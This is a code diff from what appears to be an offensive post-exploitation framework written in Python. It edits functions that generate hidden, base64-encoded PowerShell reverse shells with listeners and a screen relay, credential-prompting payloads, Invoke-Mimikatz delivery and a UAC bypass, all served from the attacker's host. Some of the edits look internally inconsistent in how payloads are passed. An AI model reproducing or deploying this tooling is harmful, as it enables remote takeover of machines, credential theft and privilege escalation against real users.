@@ -84,7 +84,6 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
     else:
         return "pass"
 
-
 def customShellcodeGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice()
     print '\n' + shellcode
@@ -92,29 +91,11 @@ def customShellcodeGeneration(payloadchoice,payloadname):
     GeneratePayload(shellcode,payloadname,shellcode)
 
 def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
-    portnum,ipaddr = reverseIpAndPort('4444')
-    shellcode = payloadchoice % (ipaddr,portnum)
-    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
-    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
-    checkClientUpload(payloadname,powershellExec,isExe=False)
-    from listener import Server
-    listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    relayserver = Server('127.0.0.1', 8081, relay=True)
-    os.system('firefox 127.0.0.1:8081')
-    print 'waiting for connection...\nCTRL + C when done\n'
-    try:
-        while not listenerserver.handlers:
-            time.sleep(0.5)
-        while listenerserver:
-            if listenerserver.handlers[1].in_buffer:
-                relayserver.handlers[1].out_buffer.append(listenerserver.handlers[1].in_buffer.pop())
-    except KeyboardInterrupt:
-        if listenerserver.handlers:
-            listenerserver.handlers[1].handle_close()
     return "pass"
 
 def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
-    clientnumber = int(clientUpload(payloadname,payloadchoice,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
+    print payloadchoice
+    clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     from stager import returnServerList
     try:
         for server in returnServerList():
@@ -135,7 +116,7 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     moduleport = FUNCTIONS().randomUnusedPort()
     FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
     powershellScript = payloadchoice % (returnIP(), moduleport)
-    clientnumber = int(clientUpload(payloadname,powershellScript,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
+    clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     from stager import returnServerList
     try:
         for server in returnServerList():
@@ -155,8 +136,6 @@ def UACBypassGeneration(payloadchoice,payloadname):
     FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
     encoded = printListener(False, True)
     powershellScript = payloadchoice % (returnIP(), moduleport, encoded)
-    clientnumber = int(clientUpload(payloadname,powershellScript,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"false", "multiple":"false"}'))
-
+    clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"false", "multiple":"false"}'))
     print t.bold_green + '\n[*] If UAC Bypass worked, expect a new admin session' + t.normal
-
     return "pass"
